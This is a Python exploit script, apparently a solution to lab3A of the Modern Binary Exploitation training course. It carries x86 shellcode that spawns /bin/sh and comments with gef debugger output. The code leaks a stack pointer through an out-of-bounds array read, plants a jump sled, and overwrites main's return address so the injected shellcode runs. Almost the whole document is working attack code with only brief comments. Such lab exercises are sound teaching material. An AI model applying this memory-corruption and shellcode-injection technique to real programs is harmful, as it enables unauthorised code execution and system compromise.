import os
import sys
import subprocess

shellcode = (
"\x31\xC9"             # xor ecx,ecx
"\xF7\xE1"             # mul ecx
"\xBB\x24\x3A\xF8\xB7" # mov ebx,0xb7f83a24 -> "/bin/sh"
"\xB0\x0B"             # mov al,0xb
"\xCD\x80"             # int 0x80
"\x90"
"\x90"
)

# gef> b * main
# gef> c
# ---snip---
# 0xbffff70c|+0x0000: 0xb7e3ca83 -> <__libc_start_main+243> mov DWORD PTR [esp], eax  <-$esp
# 0xbffff710|+0x0004: 0x00000001
# 0xbffff714|+0x0008: 0xbffff7a4 -> 0xbffff8c5 -> "/levels/lab03/lab3A"
# 0xbffff718|+0x000c: 0xbffff7ac -> 0xbffff8d9 -> "XDG_SESSION_ID=8"
# 0xbffff71c|+0x0010: 0xb7feccea -> <call_init.part+26> add ebx, 0x12316
# 0xbffff720|+0x0014: 0x00000001
# 0xbffff724|+0x0018: 0xbffff7a4 -> 0xbffff8c5 -> "/levels/lab03/lab3A"
# 0xbffff728|+0x001c: 0xbffff744 -> 0x598359db
# ---snip---
# root@kali:~/MBE/0x08 - Shellcoding Lab/sploits/lab3A# ./calcPOC 0xbffff718
# index: 1073741709
# --snip---
# root@kali:~/MBE/0x08 - Shellcoding Lab/sploits/lab3A# ./checkAddr -1073741709
# *data[-1073741709]=0xbffff714, JUMP TAKEN: N, NUM STORED: Y <--- BOOM
# *data[-1073741708]=0xbffff718, JUMP TAKEN: N, NUM STORED: Y

def leak_pointer():
  leak_ptr  = "read\n"         # out of bounds read 
  leak_ptr += "-1073741709\n"  # 0xbffff714|+0x0008: <leak>
  leak_ptr += "quit"

  cmd = "echo \"{:s}\" | /levels/lab03/lab3A".format(leak_ptr)
  r = os.popen(cmd).read()
  addr = r.split('\n')[11].split(' ')[9]

  sys.stderr.write("[*] got a pointer to data[-1073741709]=0xbffff714: %s\n" % hex(int(addr)))

  return int(addr)

def exploit_buffer(base_address):
  offset2libc = -0xc8           # leak subtracted from base address == RET dest

  injection  = "store\n"        # Jump Sled the most stable method
  injection += "216731371\n"    # 0x0ceb0eeb -> jmp 0xe, jmp 0xc
  injection += "97\n"           # data[97]

  injection += "store\n"        # ^
  injection += "149621483\n"    # 0x08eb0aeb -> jmp 0xa, jmp 0x8
  injection += "98\n"           # data[98]

  ret = base_address + offset2libc

  sys.stderr.write("[+] return address will be at %s\n" % hex(ret))

  overwrite  = "store\n"        # overwrite RET at <main+553>
  overwrite += "%d\n" % (ret)   # 0xbffff79c -> data[97]
  overwrite += "-1073741715\n"  # POC proved data[-1073741715] -> 0xbffff6fc
  overwrite += "quit"           # inject our shellcode by appending it
  overwrite += shellcode        # <--- our shellcode
  overwrite += '\n'             #

  payload = injection + overwrite
  sys.stdout.write(payload)

def main():
  ptr = leak_pointer()
  exploit_buffer(ptr)

main()
